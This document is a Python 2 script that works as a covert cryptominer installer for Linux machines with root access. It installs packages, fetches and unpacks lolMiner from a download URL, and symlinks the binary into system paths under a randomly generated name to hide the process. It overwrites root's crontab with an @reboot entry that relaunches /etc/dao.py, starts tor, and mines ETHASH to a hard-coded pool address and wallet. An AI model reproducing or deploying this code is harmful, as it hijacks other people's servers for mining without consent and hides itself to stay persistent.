__author__ = 'root'
import time
import urllib2
import urllib
import os,sys
import subprocess
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast, random, string
useproxy = 0
os.system('chmod 777 ' + __file__)
program = ''
link_github = 'https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz'
link_folder = 'lolMiner_v1.51a_Lin64.tar.gz'
for k in range(1, 8, 1):
    program += random.choice(string.ascii_lowercase)
os.system('pkill ' + program)

try:
    os.system('apt-get update -y')
    os.system('apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git')
except:
    pass
try:

    if not os.path.isfile('/root/1.51a/lolMiner'):
        os.chdir('/root')
        #os.system('rm -rf %s' %link_folder)
        os.system('wget ' + link_github)
        os.system('tar -zxf ' + link_folder)
        os.chdir('/root/1.51a')
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + 'lolMiner' + ' ' +'/usr/local/bin/' + program)
        os.system('ln -s -f ' + workingdir + '/' + 'lolMiner' + ' ' + '/usr/bin/' + program)
        time.sleep(2)
    else:
        try:
            os.chdir('/root/1.51a')
            workingdir = os.getcwd()
            os.system('ln -s -f ' + workingdir + '/' + 'lolMiner' + ' ' + '/usr/local/bin/' + program)
            os.system('ln -s -f ' + workingdir + '/' + 'lolMiner' + ' ' + '/usr/bin/' + program)
            time.sleep(2)
        except:
            pass
    try:
        path = '/var/spool/cron/crontabs/root'
        data = '@reboot screen -dm python /etc/dao.py'
        os.system('echo %s > %s' %(data, path))
        os.system('chmod 600 %s' %path)
    except:
        pass
except:
    pass

os.system('tor &')
time.sleep(60)

os.system (program + ' --algo ETHASH --pool 172.65.247.152:4444 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701.'+program)
